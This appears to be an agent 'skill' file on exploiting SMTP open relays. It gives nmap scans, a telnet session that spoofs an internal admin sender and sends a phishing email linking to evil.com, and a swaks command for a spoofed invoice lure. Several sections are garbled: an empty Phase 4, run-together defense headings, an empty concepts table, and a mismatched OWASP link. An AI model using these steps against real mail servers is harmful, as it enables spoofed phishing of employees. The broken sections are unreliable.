---
name: smtp-open-relay-abuse
description: >
  Identify and exploit SMTP Open Relays. This skill teaches how to test mail servers to determine 
  if they process email delivery regardless of the sender or recipient domain, enabling attackers to 
  spoof internal addresses and bypass basic anti-phishing controls.
domain: cybersecurity
subdomain: penetration-testing
category: Network
difficulty: beginner
estimated_time: "1 hour"
mitre_attack:
  tactics: [TA0001]
  techniques: [T1566.001]
platforms: [network, linux, windows]
tags: [smtp, open-relay, phishing, spoofing, network-pentesting, email-security]
tools: [telnet, nmap, swaks]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# SMTP Open Relay Abuse

## When to Use
- When auditing an organization's network perimeter and discovering exposed SMTP services (port 25, 465, 587).
- To demonstrate how misconfigured mail servers can be leveraged for anonymized spamming or highly effective, internally-spoofed phishing campaigns during a Red Team engagement.


## Prerequisites
- Network access to the target subnet (VPN, pivot, or direct connection)
- Nmap and relevant network scanning tools installed
- Understanding of TCP/IP, common protocols, and network segmentation
- Root/admin access on the attack machine for raw socket operations

## Workflow

### Phase 1: Identifying Open SMTP Ports

```bash
# nmap -p 25,465,587 --open -sV IP_ADDRESS

# nmap -p 25 --script smtp-open-relay IP_ADDRESS
```

### Phase 2: Manual Verification via Telnet

```text
# telnet IP_ADDRESS 25

# HELO attacker.local

# MAIL FROM:<admin@targetcompany.com>

# RCPT TO:<employee@targetcompany.com>

# DATA
Subject: Critical IT Update
From: admin@targetcompany.com
To: employee@targetcompany.com

Please click the following link to secure your account: http://evil.com/login
.
# QUIT
```

### Phase 3: Automated Exploitation using SWAKS

```bash
# swaks --to employee@targetcompany.com --from admin@targetcompany.com --server IP_ADDRESS --body "Please review the attached document." --header "Subject: Invoice Overdue"
```

### Phase 4: Utilizing Extended SMTP (ESMTP) and Authentication Bypasses

```text
# ```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Connect SMTP ] --> B{Accepts RCPT ]}
    B -->|Yes| C[Open Relay ]
    B -->|No| D[Check Auth ]
    C --> E[Send Phish gently ]
```

## 🔵 Blue Team Detection & Defense
- **Require Authentication**: **Network Filtering (Firewalls)**: **Domain Verification (SPF/DKIM/DMARC)**: Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Smtp Open Relay Abuse — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- OWASP: [Testing for SMTP Open Relay](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/01-Test_Role_Definitions)
- Nmap Script: [smtp-open-relay](https://nmap.org/nsedoc/scripts/smtp-open-relay.html)
